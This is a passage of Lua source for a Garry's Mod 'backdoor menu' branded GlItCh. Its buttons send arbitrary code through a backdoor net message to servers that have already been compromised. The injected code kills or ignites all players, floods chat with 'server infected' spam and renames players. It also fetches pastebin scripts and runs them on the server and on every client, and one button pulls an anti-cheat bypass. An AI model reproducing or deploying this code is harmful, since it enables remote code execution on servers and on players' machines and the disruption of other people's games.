surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local DScrollPanel = vgui.Create( "DScrollPanel", DGE.HTXCommandeSelector )
DScrollPanel:Dock( FILL )
local commandnethtx1 = vgui.Create("DButton", DScrollPanel)
commandnethtx1:SetSize( 208, 20 )
commandnethtx1:SetPos( 2, 100 )
commandnethtx1:SetText("Kill Everyone in Server")
commandnethtx1:SetTextColor(Color(255, 255, 255, 255))
commandnethtx1.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx1.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Everyone's dead." )
DGE.NetStart(exploitent)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx2 = vgui.Create("DButton", DScrollPanel)
commandnethtx2:SetSize( 208, 20 )
commandnethtx2:SetPos( 2, 125 )
commandnethtx2:SetText("=GlItCh=PARTY=MODE=")
commandnethtx2:SetTextColor(Color(255, 255, 255, 255))
commandnethtx2.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx2.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Disco successfully launched" )
net.Start(exploitent)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/617S3m9V\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
DGE.NetStart(exploitent)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/ikc2.mp3\", \"mono noblock\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx4 = vgui.Create("DButton", DScrollPanel )
commandnethtx4:SetSize( 208, 20 )
commandnethtx4:SetPos( 2, 150 )
commandnethtx4:SetText("Set everyone on fire")
commandnethtx4:SetTextColor(Color(255, 255, 255, 255))
commandnethtx4.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx4.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "BURN THEM ALL" )
DGE.NetStart(exploitent)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx7 = vgui.Create("DButton", DScrollPanel)
commandnethtx7:SetSize( 208, 20 )
commandnethtx7:SetPos( 2, 175 )
commandnethtx7:SetText("Chat VictoryRoyale")
commandnethtx7:SetTextColor(Color(255, 255, 255, 255))
commandnethtx7.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
local ChatSPAMM = false
commandnethtx7.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
RainbowMike = {
"chat.AddText(Color(255, 0, 0, 255), \" ✔THIS SERVER IS INFECTED BY GlItCh<>Best BackdoorMenu\")",
"chat.AddText(Color(255, 0, 95, 255), \" ======☼=========SERVER SIEZED=======☼=========== \")",
"chat.AddText(Color(255, 0, 156, 255), \"  ✔THIS SERVER IS INFECTED BY GlItCh<>Best BackdoorMenu\")",
"chat.AddText(Color(255, 0, 202, 255), \" ==========SERVER SIEZED=======☼========☼=======☼  \")",
"chat.AddText(Color(232, 0, 255, 255), \" ✔THIS SERVER IS INFECTED BY GlItCh<>Best BackdoorMenu\")",
"chat.AddText(Color(170, 0, 255, 255), \" ============================SERVER SIEZED======= \")",
"chat.AddText(Color(48, 0, 255, 255), \" ✔THIS SERVER IS INFECTED BY GlItCh<>Best BackdoorMenu\")",
"chat.AddText(Color(0, 59, 255, 255), \" =======☼=======☼====SERVER SIEZED=====☼========= \")",
"chat.AddText(Color(0, 120, 255, 255), \" ✔THIS SERVER IS INFECTED BY GlItCh<>Best BackdoorMenu\")",
"chat.AddText(Color(0, 197, 255, 255), \" =======☼==SERVER SIEZED====☼====☼===========☼=== \")",
"chat.AddText(Color(0, 255, 252, 255), \" ✔THIS SERVER IS INFECTED BY GlItCh<>Best BackdoorMenu\")",
"chat.AddText(Color(0, 255, 175, 255), \" ☼========================SERVER SIEZED=======☼== \")",
"chat.AddText(Color(0, 255, 99, 255), \" ✔THIS SERVER IS INFECTED BY GlItCh<>Best BackdoorMenu\")",
"chat.AddText(Color(8, 255, 0, 255), \" ==☼===========☼=SERVER SIEZED======☼☼======☼==== \")",
"chat.AddText(Color(115, 255, 0, 255), \" ✔THIS SERVER IS INFECTED BY GlItCh<>Best BackdoorMenu\")",
"chat.AddText(Color(192, 255, 0, 255), \" =====SERVER SIEZED===========☼===========☼====== \")",
"chat.AddText(Color(238, 255, 0, 255), \" ✔THIS SERVER IS INFECTED BY GlItCh<>Best BackdoorMenu\")",
   "chat.AddText(Color(255, 226, 0, 255), \" ================☼☼=====SERVER SIEZED=☼========= \")",
       "chat.AddText(Color(255, 165, 0, 255), \" ✔THIS SERVER IS INFECTED BY GlItCh<>Best BackdoorMenu\")",
"chat.AddText(Color(255, 89, 0, 255), \" ✔THIS SERVER IS INFECTED BY GlItCh<>Best BackdoorMenu\")"
}
ChatSPAMM = !ChatSPAMM
        if( ChatSPAMM ) then
                timer.Create( "SPAMMER101", 0.0001, 0, function()
                    net.Start(exploitent)
                    net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([["..table.Random(RainbowMike).."]]) end " )
                    net.WriteBit (1)
                    net.SendToServer()
                end )
        else
                timer.Destroy( "SPAMMER101" )
 
 
        end
    end
local commandnethtx8 = vgui.Create("DButton", DScrollPanel)
commandnethtx8:SetSize( 208, 20 )
commandnethtx8:SetPos( 2, 200 )
commandnethtx8:SetText("Change all models")
commandnethtx8:SetTextColor(Color(255, 255, 255, 255))
commandnethtx8.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx8.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Change" )
DGE.NetStart(exploitent)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx9 = vgui.Create("DButton", DScrollPanel)
commandnethtx9:SetSize( 208, 20 )
commandnethtx9:SetPos( 2, 225 )
commandnethtx9:SetText("Break physics")
commandnethtx9:SetTextColor(Color(255, 255, 255, 255))
commandnethtx9.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(255, 196, 0, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx9.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Broken" )
net.Start(exploitent)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx12 = vgui.Create("DButton", DScrollPanel)
commandnethtx12:SetSize( 208, 20 )
commandnethtx12:SetPos( 2, 250 )
commandnethtx12:SetText("Adventure Mode")
commandnethtx12:SetTextColor(Color(255, 255, 255, 255))
commandnethtx12.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx12.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Wuhuu" )
net.Start(exploitent)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx13 = vgui.Create("DButton", DScrollPanel)
commandnethtx13:SetSize( 208, 20 )
commandnethtx13:SetPos( 2, 275 )
commandnethtx13:SetText("Change everyone's names")
commandnethtx13:SetTextColor(Color(255, 255, 255, 255))
commandnethtx13.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx13.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Changed" )
net.Start(exploitent)
net.WriteString( "for k, v in pairs(player.GetAll()) do v:ConCommand(\"say /name GlItChSystems Hacked Server\"); end" ) -- net.WriteString( "for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx16 = vgui.Create("DButton", DScrollPanel)
commandnethtx16:SetSize( 208, 20 )
commandnethtx16:SetPos( 2, 300 )
commandnethtx16:SetText("GROWLING Step")
commandnethtx16:SetTextColor(Color(255, 255, 255, 255))
commandnethtx16.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(255, 196, 0, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx16.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Ах" )
net.Start(exploitent)
net.WriteString( "hook.Add(\"PlayerFootstep\", \"porn\", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( \"npc/ichthyosaur/attack_growl1.wav\",75,math.random( 50, 150 )) end )" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx18 = vgui.Create("DButton", DScrollPanel)
commandnethtx18:SetSize( 208, 20 )
commandnethtx18:SetPos( 2, 325 )
commandnethtx18:SetText("Hell on Earth")
commandnethtx18:SetTextColor(Color(255, 255, 255, 255))
commandnethtx18.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(255, 0, 0, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx18.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "hellstart/hellend" )
net.Start(exploitent)
net.WriteString([[BroadcastLua("http.Fetch('https://pastebin.com/raw/21tkfuM1',function(b,l,h,c)RunString(b)end,nil)")]])
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx19 = vgui.Create("DButton", DScrollPanel)
commandnethtx19:SetSize( 208, 20 )
commandnethtx19:SetPos( 2, 350 )
commandnethtx19:SetText("-Ears of all players")
commandnethtx19:SetTextColor(Color(255, 255, 255, 255))
commandnethtx19.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(255, 0, 0, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx19.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "-ears" )
net.Start(exploitent)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx20 = vgui.Create("DButton", DScrollPanel)
commandnethtx20:SetSize( 208, 20 )
commandnethtx20:SetPos( 2, 375 )
commandnethtx20:SetText("Earthquake")
commandnethtx20:SetTextColor(Color(255, 255, 255, 255))
commandnethtx20.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx20.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Run" )
net.Start(exploitent)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx20 = vgui.Create("DButton", DScrollPanel)
commandnethtx20:SetSize( 208, 20 )
commandnethtx20:SetPos( 2, 400 )
commandnethtx20:SetText("TORNADO CAM")
commandnethtx20:SetTextColor(Color(255, 255, 255, 255))
commandnethtx20.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx20.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Run" )
net.Start(exploitent)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 60, 5, 60, 9999 )]] ) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx21 = vgui.Create("DButton", DScrollPanel)
commandnethtx21:SetSize( 208, 20 )
commandnethtx21:SetPos( 2, 425 )
commandnethtx21:SetText("2D models")
commandnethtx21:SetTextColor(Color(255, 255, 255, 255))
commandnethtx21.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(255, 0, 0, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx21.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Back" )
net.Start(exploitent)
net.WriteString([[
    for k,v in pairs(player.GetAll()) do
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
 
        v:ManipulateBoneScale( a, Vector(4,0,4))
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end]])
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx23 = vgui.Create("DButton", DScrollPanel)
commandnethtx23:SetSize( 208, 20 )
commandnethtx23:SetPos( 2, 475 )
commandnethtx23:SetText("Make Players Giants")
commandnethtx23:SetTextColor(Color(255, 255, 255, 255))
commandnethtx23.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(255, 196, 0, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx23.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Everyone's become giants." )
local giant = [[
hook.Add("Think", "giant", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(10, 100);
    end
end)]]
net.Start(exploitent)
net.WriteString( giant )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx24 = vgui.Create("DButton", DScrollPanel)
commandnethtx24:SetSize( 208, 20 )
commandnethtx24:SetPos( 2, 500 )
commandnethtx24:SetText("Make everyone tall")
commandnethtx24:SetTextColor(Color(255, 255, 255, 255))
commandnethtx24.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(255, 196, 0, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx24.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "EVERYONE IS TALL." )
local tall = [[
hook.Add("Think", "tall", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(3, 80);
    end
end)]]
net.Start(exploitent)
net.WriteString( tall )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx25 = vgui.Create("DButton", DScrollPanel)
commandnethtx25:SetSize( 208, 20 )
commandnethtx25:SetPos( 2, 525 )
commandnethtx25:SetText("SpeedHack")
commandnethtx25:SetTextColor(Color(255, 255, 255, 255))
commandnethtx25.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(255, 0, 0, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx25.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Gotta Go Fast" )
local speedhack = [[
hook.Add("Think", "GOTTA GO FAST HACK", function()
    for k,v in pairs (player.GetAll()) do
        v:SetRunSpeed(900* 4);
        v:SetWalkSpeed(300 * 2);
    end
end)]]
net.Start(exploitent)
net.WriteString( speedhack )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx26 = vgui.Create("DButton", DScrollPanel)
commandnethtx26:SetSize( 208, 20 )
commandnethtx26:SetPos( 2, 550 )
commandnethtx26:SetText("GlItCh COUGH")
commandnethtx26:SetTextColor(Color(255, 255, 255, 255))
commandnethtx26.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(255, 196, 0, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx26.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "GlItCh coughs on u" )
net.Start(exploitent)
net.WriteString([[
for k,v in pairs(player.GetAll()) do
    timer.Create("cough", 10, 0, function()
        RunConsoleCommand("say", "GlItCh Has Bad COUGH...")
        v:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)
        util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 1, 5000 )
    end)
end
]])
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx27 = vgui.Create("DButton", DScrollPanel)
commandnethtx27:SetSize( 208, 20 )
commandnethtx27:SetPos( 2, 575 )
commandnethtx27:SetText("Azis - Full-screen Hop")
commandnethtx27:SetTextColor(Color(255, 255, 255, 255))
commandnethtx27.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(255, 198, 0, 255)
surface.DrawRect(0, 0, w, h)
end
local commandnethtx8 = vgui.Create("DButton", DScrollPanel)
commandnethtx8:SetSize( 208, 20 )
commandnethtx8:SetPos( 2, 600 )
commandnethtx8:SetText("!!ZOMBIES MODE!!")
commandnethtx8:SetTextColor(Color(255, 255, 255, 255))
commandnethtx8.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx8.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Change" )
DGE.NetStart(exploitent)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/ieR3.mp3\", \"mono\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
DGE.NetStart(exploitent)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/Zombie/Classic.mdl\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx8 = vgui.Create("DButton", DScrollPanel)
commandnethtx8:SetSize( 208, 20 )
commandnethtx8:SetPos( 2, 625 )
commandnethtx8:SetText("COUCH POTATOE :)")
commandnethtx8:SetTextColor(Color(255, 255, 255, 255))
commandnethtx8.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx8.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Change" )
DGE.NetStart(exploitent)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/ieSg.mp3\", \"mono noblock\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
DGE.NetStart(exploitent)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/props_c17/FurnitureCouch001a.mdl\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx8 = vgui.Create("DButton", DScrollPanel)
commandnethtx8:SetSize( 208, 20 )
commandnethtx8:SetPos( 2, 650 )
commandnethtx8:SetText("GlItCh.exe")
commandnethtx8:SetTextColor(Color(255, 255, 255, 255))
commandnethtx8.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(255, 0, 0, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx8.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Change" )
DGE.NetStart(exploitent)
net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/ifBV.mp3\", \"mono noblock\", function()end )]])" )
net.WriteBit(1)
net.SendToServer()
DGE.NetStart(exploitent)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/shadertest/vertexlitselfillummaskenvmaptex.mdl\") end" )
net.WriteBit(1)
net.SendToServer()
net.Start(exploitent)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 200, 10, 200, 99999 )]] ) end" )
net.WriteBit(1)
net.SendToServer()
net.Start(exploitent)
net.WriteString( "for k, v in pairs(player.GetAll()) do v:ConCommand(\"say /name GlItCh GlItCh Hacked Server\"); end" ) -- net.WriteString( "for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
DGE.NetStart(exploitent)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(200) end" )
net.WriteBit(1)
net.SendToServer()
net.Start(exploitent)
net.WriteString([[
for k,v in pairs(player.GetAll()) do
    timer.Create("cough", 5, 0, function()
        RunConsoleCommand("say", "SERVER SIEZED BY GlItChSystems")
        v:EmitSound("npc/dog/dog_alarmed3.wav"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)
        util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 1, 5000 )
    end)
end
]])
net.WriteBit(1)
net.SendToServer()
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx25 = vgui.Create("DButton", DScrollPanel)
commandnethtx25:SetSize( 208, 20 )
commandnethtx25:SetPos( 2, 675 )
commandnethtx25:SetText("PLAYER TETHER")
commandnethtx25:SetTextColor(Color(255, 255, 255, 255))
commandnethtx25.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(255, 0, 0, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx25.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "PLAYERS TETHERD" )
local speedhack = [[
hook.Add("Think", "PLAYERS TETHERD", function()
    for k,v in pairs (player.GetAll()) do
        v:SetRunSpeed(-200);
        v:SetWalkSpeed(-200);
    end
end)]]
net.Start(exploitent)
net.WriteString( speedhack )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx2 = vgui.Create("DButton", DScrollPanel)
commandnethtx2:SetSize( 208, 20 )
commandnethtx2:SetPos( 2, 700 )
commandnethtx2:SetText("BYPASS SNTE")
commandnethtx2:SetTextColor(Color(255, 255, 255, 255))
commandnethtx2.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx2.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "SNTE Bypasser Successfully Launched" )
net.Start(exploitent)
net.WriteString( "http.Fetch(\"https://pastebin.com/Pptp6Uny\",function(b,l,h,c)RunString(b)end,nil)" )
net.Start(exploitent)
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx13 = vgui.Create("DButton", DScrollPanel)
commandnethtx13:SetSize( 208, 20 )
commandnethtx13:SetPos( 2, 725 )
commandnethtx13:SetText("Change everyone's Jobs")
commandnethtx13:SetTextColor(Color(255, 255, 255, 255))
commandnethtx13.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx13.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "GlItCh", "] ", Color( 255, 255, 255 ), "Changed" )
net.Start(exploitent)
net.WriteString( "for k, v in pairs(player.GetAll()) do v:ConCommand(\"say /job GlItCh GlItCh Hacked Server\"); end" ) -- net.WriteString( "for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx7 = vgui.Create("DButton", DScrollPanel)
commandnethtx7:SetSize( 208, 20 )
commandnethtx7:SetPos( 2, 750 )
commandnethtx7:SetText("Server.exe Fail SPAM")
commandnethtx7:SetTextColor(Color(255, 255, 255, 255))
commandnethtx7.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(39, 224, 35, 255)
surface.DrawRect(0, 0, w, h)
end
local ChatSPAMM = false
commandnethtx7.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
RainbowMike = {
"chat.AddText(Color(255, 0, 0, 255), \"Console:⚠️Oh No Looks Like Server.exe has Stopped Working...\")",
"chat.AddText(Color(255, 0, 0, 255), \"Console:⚠️Oh No Looks Like Server.exe has Stopped Working...\")",
"chat.AddText(Color(255, 0, 0, 255), \"Console:⚠️Oh No Looks Like Server.exe has Stopped Working...\")",
"chat.AddText(Color(255, 0, 0, 255), \"Console:⚠️Oh No Looks Like Server.exe has Stopped Working...\")",
"chat.AddText(Color(255, 0, 0, 255), \"Console:⚠️Oh No Looks Like Server.exe has Stopped Working...\")",
"chat.AddText(Color(255, 0, 0, 255), \"Console:⚠️Oh No Looks Like Server.exe has Stopped Working...\")",
"chat.AddText(Color(255, 0, 0, 255), \"Console:⚠️Oh No Looks Like Server.exe has Stopped Working...\")",
"chat.AddText(Color(255, 0, 0, 255), \"Console:⚠️Oh No Looks Like Server.exe has Stopped Working...\")",
